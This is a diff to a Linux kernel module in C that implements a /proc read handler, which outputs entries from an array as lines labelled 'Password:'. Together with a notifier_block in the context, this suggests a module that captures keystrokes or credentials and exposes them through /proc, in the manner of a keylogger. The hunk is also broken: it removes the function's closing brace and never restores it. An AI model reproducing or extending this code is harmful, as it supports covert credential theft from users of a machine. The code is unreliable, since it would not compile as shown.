@@ -21,8 +21,35 @@ struct notifier_block nb;
 ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp ) 
 {
 	
-	return 0;
-}
+	static int pos = 0;
+    int len;
+    char temp_buf[100];
+    
+    if (pos >= 100) {
+        pos = 0;
+        return 0; // End of file
+    }
+    
+    // Format each line similar to dmesg output
+    len = snprintf(temp_buf, sizeof(temp_buf), "Password: %d %s\n", pos + 1, str[pos]);
+    
+    if (len <= 0) {
+        return -EINVAL; // Error in formatting
+    }
+    
+    if (len > count) {
+        len = count;
+    }
+    
+    // Copy the formatted string to user buffer
+    if (copy_to_user(buf, temp_buf, len)) {
+        return -EFAULT; // Error in copying to user buffer
+    }
+    
+    pos++;
+    *offp += len;
+    
+    return len;
 
 struct proc_ops proc_fops = {
 	proc_read: read_simple,
